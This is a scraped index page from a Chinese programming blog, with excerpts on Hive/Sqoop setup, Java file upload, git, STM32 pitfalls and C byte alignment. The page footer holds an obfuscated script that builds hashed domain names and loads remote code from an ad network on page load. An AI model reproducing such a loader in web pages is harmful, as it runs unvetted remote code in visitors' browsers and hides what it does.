将指定路径下的Hive安装包解压到（/usr/local/src）下，使用绝对路径，将命令复制并粘贴至对应报告中；把解压后的apache-hive-1.1.0-bin文件夹更名为hive；进入hive文件夹，并将查看命令及结果复制并粘贴至对应报告中；设置Hive环境变量，并使环境变量只对当前root用户生效；并将环境变量配置内容复制并粘贴至对应报告中；将Hive安装目录里hive-default.xml.template文件更名为hive-site.xml；并将更改命令复制并粘贴至对应报告中；通过VI编辑器配置hive-site.xml文件，将MySQL数据库作为Hive元数据库。将配置文件“Hive元存储”相关内容复制并粘贴至对应报告中；初始化Hive元数据，将MySQL数据库JDBC驱动拷贝到Hive安装目录的lib文件夹下；并通过schematool命令执行初始化，将初始化结果复制粘贴至对应报告中；启动Hive并保存命令输出结果，将结果输出复制粘贴至对应报告中。 任务三：Sqoop组件部署管理
本环节需要使用root用户完成相关配置，已安装Hadoop及需要配置前置环境，具体部署要求如下：
解压/chinaskills路径下的Sqoop安装包到/usr/local/src路径下，并使用相关命令，修改解压后文件夹名为sqoop，进入sqoop文件夹，并将查看内容复制粘贴至对应报告中；修改Sqoop环境变量，并使环境变量只对当前root用户生效,并将变量内容复制粘贴至对应报告中；修改并配置sqoop-env.sh文件，并将修改内容复制粘贴至对应报告中；测试Sqoop连接MySQL数据库是否成功，结果复制粘贴至对应报告中。 模块B：数据采集与处理（20分）
项目背景说明
查看餐饮外送统计平台网站源码结构。 打开网站，在网页中右键点击检查，或者F12快捷键，查看源码页面；检查网站：浏览网站源码查看所需内容。 从餐饮外送统计平台中采集需要数据，按照要求使用Python语言编写代码工程，获取指定数据项，并对结果数据集进行必要的数据处理。请将符合任务要求的结果复制粘贴至对应报告中。 具体步骤如下：
创建工程工程项目：C:\food_delivery构建采集请求按要求定义相关字段获取有效数据将获取到的数据保存到指定位置对数据集进行基础的数据处理 至此已从餐饮外送统计平台中获取所需数据，并完成了必要的基础的数据处理。
自行创建Scrapy工程项目food_delivery，路径为C:\ food_delivery按照任务要求从餐饮外送统计平台中获取数据。提取“商户数据”页面相关字段（包括平台餐厅ID、餐厅名称、城市等全部有效数据项），保存至文件restaurant_data.json；再提取“配送平台灰测维度数据”页面相关数据（包括餐厅名称、城市、营业时长等全部字段）保存至文件grey_test.json。每条数据记录请以单独一行保存，信息存储格式为key：value。文件保存路径为：C:\output。 示例：
{" rest_id ": "***", " rest_name ": "***",……}，
{" rest_id "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b314edba908f77f9a38117b67e507875/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2721ad60ba4880503f8d45877123cb7b/" rel="bookmark">
			【 文件上传】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题# 文件上传 1.两个jar包必须导入
common-fileupload
common-io
文件上传注意事项
为保证服务器的安全，上传的文件应放在外界无法访问的目录下，如WEN-INF。为防止同名文件产生覆盖现象，要为文件指定一个唯一的文件名。比如时间戳，uuid，MD5加密要对上传文件的大小进行限制。限制上传文件的类型，收到文件时，判断文件名十分合法。 需要用到的类
ServletFileUpload负责处理上传的文件数据，并将表单中的每个输入项封装成一个``FileItem对象，在使用ServletFileUpload对象解析请求时需要DiskFileItemFactory对象。所以，我们需要在进行解析工作前构造好DiskFileItemFactory对象，通过ServletFileItem对象的构造方法或setFileItemFactory()设置ServletFileUpload对象的fileItemFactory`属性。
FileItem类
method="post"
这里method的选用，为什么要用post
get：上传文件大小有限制
post：上传文件大小没有限制。
所以要用post
再HTML页面中input必须有name
&lt;p&gt;&lt;input type="file" name="file1"&gt;&lt;/p&gt; 在HTML页面中必须要有name：
上传文件：
表单中如果包含一个文件上传项的话，这个表单的entype属性必须设置为multipart/form-data
index.jsp的form表单
&lt;form action="${pageContext.request.contextPath}/upload.do" enctype="multipart/form-data" method="post"&gt; 上传用户：&lt;input type="text" name="username"&gt;&lt;br/&gt; &lt;p&gt;&lt;input type="file" name="file1"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="file" name="file2"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit"&gt;| &lt;input type="reset"&gt;&lt;/p&gt; 常用方法介绍
isFormFile方法用于判断FileItem类对象封装的数据是一个普通文本表单
还是一个文件表单，如果时普通表单字段则返回true，否则返回false
booleanisField();
getFieldName方法用于返回表单标签name属性的值
String getFieldName();
getString方法用于将FileItem对象中保存的数据流内容以一个字符串返回
String getString();
getName方法用于获得文件上传字段中的文件名。
String getName();
以流的形式返回上传文件的数据内容。
InputStream getInputStream();
delete方法用来清空FileItem类对象中存放的主体内容
如果主体内容被保存在临时文件中，delete方法将删除该临时文件
void delete();
ServletFileUpload类
ServletFileUpload负责处理上传的文件数据，并将表单中的每个输入项封装成一个FileItem对象中，使用其``parseRequest(**HttpServletRequest**)方法可以将通过表单中每一个HTML标签提交的数据封装成一个FileItem对象，然后以List`列表的形式返回。使用该方法处理上传文件简单易用。
核心代码
try { //1、创建DiskFileItemFactory对象，处理文件上传路径或限制文件大小 DiskFileItemFactory factory = getDiskFileItemFactory(file); //获取ServletFileUpload ServletFileUpload upload = getServletFileUpload(factory); //3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2721ad60ba4880503f8d45877123cb7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99b14f4352d72a871f566b6ff6132a21/" rel="bookmark">
			Ubuntu 18.04 root启动vscode无反应的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		执行以下：
code --user-data-dir=~/.vscode --verbose 查看报错信息：
Running as root without --no-sandbox is not supported. See https://crbug.com/638180. 因此最终执行命令 ：
code --user-data-dir=~/.vscode --no-sandbox 后面遇到启动问题的小伙伴加个verbos选项看看什么错误吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1eae01b101db9f32d7bcde14244b772/" rel="bookmark">
			ModuleNotFoundError: No module named ‘tensorrt‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		并不是所有的平台都支持tensorrt的python库。
目前，所有版本的TensorRT(当前最高为8.0.2)不支持windows下的python API.
补充：最新版本的TensorRT8.4.0已经支持windows下的Tensort python API，如下图所示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4129c9151406cbc40920f6bdba184647/" rel="bookmark">
			空间复杂度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、概念定义
二、符号表示
三、常见种类
四、示例解析
五、时空权衡
一、概念定义 空间复杂度涉及的空间类型有：
输入空间： 存储输入数据所需的空间大小；
暂存空间： 算法运行过程中，存储所有中间变量和对象等数据所需的空间大小；
输出空间： 算法运行返回时，存储输出数据所需的空间大小；
通常情况下，空间复杂度指在输入数据大小为 N 时，算法运行所使用的「暂存空间」+「输出空间」的总体大小。
而根据不同来源，算法使用的内存空间分为三类：
指令空间：
编译后，程序指令所使用的内存空间。
数据空间：
算法中的各项变量使用的空间，包括：声明的常量、变量、动态数组、动态对象等使用的内存空间。
struct Node { int val; Node *next; Node(int x) : val(x), next(NULL) {} }; void algorithm(int N) { int num = N; // 变量 int nums[N]; // 动态数组 Node* node = new Node(N); // 动态对象 } 栈帧空间：
程序调用函数是基于栈实现的，函数在调用期间，占用常量大小的栈帧空间，直至返回后释放。如以下代码所示，在循环中调用函数，每轮调用 test() 返回后，栈帧空间已被释放，因此空间复杂度仍为 O(1)。
int test() { return 0; } void algorithm(int N) { for (int i = 0; i &lt; N; i++) { test(); } } 算法中，栈帧空间的累计常出现于递归调用。如以下代码所示，通过递归调用，会同时存在 N 个未返回的函数 algorithm() ，此时累计使用 O(N) 大小的栈帧空间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4129c9151406cbc40920f6bdba184647/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81d637af3a7c4bdadd018ad65ddedaff/" rel="bookmark">
			git中关于工作区，暂存区，本地仓库，远程仓库的一些问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理 参考阮一峰的博客：常用 Git 命令清单
workspace: 直接写好的代码，以文件形式存在硬盘上的，其实就是保存在workspace工作区;index/stage: git add之后会存入stage/index暂存区；repository: git commit之后会存入repository本地仓库;remote: git push 之后会存入remote远程仓库. 如果还是不太明白，可以继续参考：
菜鸟教程-Git 工作区、暂存区和版本库git init - 建立數據庫 Git, GitHub, &amp; Workflow Fundamentals Version control with Git github官方文档-GitHub flowLearn Git with Bitbucket Cloudgit - 简明指南 1. gitignore并从远程git中删除要忽略的目录 参考：idea创建.gitignore并从远程git中删除要忽略的目录（如.idea）
问题描述：
remote的git中内容：
.gitignore中的内容：d2l_zh_jupyter/self_exercise/.ipynb_checkpoints/ 本地git仓库的内容：
可以看到，
虽然我的.gitignore文件中包含了这个文件夹，但是remote的git仓库还是有这个文件夹，没有删除。但是其文件内容确实和本地不同。这是因为我是上传过一段时间之后，才创建的.gitignore文件，所以有些问题。 # 停止追踪指定文件，但该文件会保留在工作区(如果是文件夹，需要迭代移除，需要加上参数-r) git rm --cached -r d2l_zh_jupyter/self_exercise/.ipynb_checkpoints/ git add .gitignore git commit -m "gitignore提交删除ipynb_checkpoints" git push origin master 执行以上操作，虽然workspace工作区中文件仍然存在，但是不会追踪（忽略），则上传之后，remote端的文件夹也会消失
2. 上传超过100MB的文件报错 参考：处理GitHub不允许上传大于100M文件问题
github上传文件时，超过50M会警告，超过100M直接拒绝
如果依然想要上传这个大文件，可以参考：git large file storage，这是git官方为了大文件专门另外搞得一个工具
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81d637af3a7c4bdadd018ad65ddedaff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aef426c2d7eb4a5d2188ed39b2e0ba85/" rel="bookmark">
			MVC优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MVC的优点：
低耦合性：视图层和业务层分离
高重用性和可适用性
较低的生命周期成本
快速的部署
可维护性
有利于软件工程化管理
提高软件的健壮性
MVC的缺点：
工作量大，增加工作的复杂性，MVC不适合小型甚至中等规模的应用程序
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3add0a05fe4df63f340f27bd07221516/" rel="bookmark">
			实现字符串翻转。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一：将字符串转换为字符数组，使用首位指针对数组进行反转
方法二：将字符串转换为StringBuffer,通过StringBuffer的构造器将String转为StringBuffer，调用StringBuffer的reverse()方法，最后调用StringBuffer的toString方法将StringBuffer转换为String。
public class TestStringBuffer {
public static void main(String[] args) {
String string = "helloWorld";
testStringBuffer(string);
testStringBuffer02(string);
}
//将字符串进行反转
//方法一
public static void testStringBuffer(String str){
char[] chars = str.toCharArray();
for (int i=0,j=chars.length-1;i&lt;j;i++,j--){
char temp = chars[i];
chars[i] = chars[j];
chars[j] = temp;
}
System.out.println(new String(chars));
}
//方法二
public static void testStringBuffer02(String str){
StringBuffer sb = new StringBuffer(str);
StringBuffer sb1 = sb.reverse();
System.out.println(sb1.toString());
}
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb08e9a081cc5bcfffa2783d02e505be/" rel="bookmark">
			使用stm32裸机或者rtt系统遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、rt-thread使用
16、LSE晶振初始化会出现一定的失败几率
15、串口队列溢出的问题
14、升级失败问题
13、rt-thread PWM1 CH1 CH1N 无法同时使用问题
12、使用换用c8芯片不能进入main函数，会出现HardFault的诊断错误
11、Fnction[rt_malloc] shall not be used in ISR
10、新建工程后，出现不能再次下载情况boot0置高。
9、移植后出现使能ping功能，现在是可以ping通，但是提示getaddinfo error。
8、F407制作软件包，修改#define STM32_SRAM_SIZE (192)后直接死掉
7、UART 接受数据时出现HardFault，错误定位在crc校验。
6、使用指针未进行地址申请，造成野指针，非法访问
5、env给予空间不足；造成不能正确存储读取数据
4、线程调用其他函数，空间过小会死掉
3、can't find timer6 device!
2、网络下载文件失败显示数组或者内存不足
1、flash出现警告[Flash] Warning: Sector header check failed. Format this sector (0x00001000).
二、git使用
5、使用git 有的会出现不在本地分上。
4、如何使用git将分支branch合并到主干master上
①新建分支并切换
②切换到主干master
③合并某个分支到主干master
④合并后删除分支信息
3、本地git远程地址替换
2、warning: adding embedded git repository: git/
1、git log --graph --all查看所有分支的提交修改
四、cubemx
1、使用cubemx生成keil工程后，原有keil配置丢失
六、visual stdio code使用
2、vscode 不能跳转到指定函数，需要安装C/C++浏览插件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb08e9a081cc5bcfffa2783d02e505be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ee7100b296eaaf6031596d3dda06a0e/" rel="bookmark">
			C语言基础 - 结构体类型字节对齐总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是字节对齐 在计算机中，内存空间是按照字节（1B = 8 bit）划分的，每一个字节都有一个编号，这就是字节的地址。理论上可以从任意起始地址访问任意数据类型的变量，但在实际使用中，访问特定数据类型变量时需要在特定的内存起始地址进行访问，这就需要各种数据类型按照一定的规则在空间上进行排列，而不是顺序地一个接一个地存放，这就是字节对齐。
如果一个变量的内存起始地址正好是其数据类型长度的整数倍，就被称作自然对齐。比如，在32系统下，假设一个int型变量的起始地址为0x00000004，那它就是自然对齐的。
1.1 C语言基本数据类型占用的字节大小 C语言基本数据类型有：
整数型：char, short, int, long, long long。
浮点型：float, double
指针类型：任意数据类型的指针变量占用的存储空间都是相同的。
我们以64位系统(x64)为例，使用 sizeof() 可以输出各个基本数据类型占用的字节长度，代码如下：
#include &lt;stdio.h&gt; int main() { printf("sizeof(char)=%d\n", sizeof(char)); printf("sizeof(short)=%d\n", sizeof(short)); printf("sizeof(int)=%d\n", sizeof(int)); printf("sizeof(long)=%d\n", sizeof(long)); printf("sizeof(long long)=%d\n", sizeof(long long)); printf("sizeof(float)=%d\n", sizeof(float)); printf("sizeof(double)=%d\n", sizeof(double)); printf("sizeof(char*)=%d, sizeof(int*)=%d, sizeof(float*)=%d\n", sizeof(char*), sizeof(int*), sizeof(float*)); return 0; } 运行结果：
sizeof(char)=1
sizeof(short)=2
sizeof(int)=4
sizeof(long)=4
sizeof(long long)=8
sizeof(float)=4
sizeof(double)=8
sizeof(char*)=8, sizeof(int*)=8, sizeof(float*)=8
&lt;说明&gt; 在32位系统(x86)上，指针类型变量是4字节；在64位系统(x64)上，指针类型变量是8字节。这跟计算机的字长有关。32位系统中，CPU一次可以存取4字节的数据；64位系统中，CPU一次可以存取8字节的数据。
二、字节对齐的原因和作用 需要字节对齐的根本原因在于CPU访问内存数据的效率问题。
（1）不同硬件平台对内存空间的存取处理方式存在不同。某些硬件平台对特定数据类型的存取只能从特定地址开始，而不允许其在内存中随意存放。
一些硬件系统对字节对齐要求非常严格，比如 SPARC系列处理器，如果取未对齐的数据会发生错误，例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ee7100b296eaaf6031596d3dda06a0e/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/297/">«</a>
	<span class="pagination__item pagination__item--current">298/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/299/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>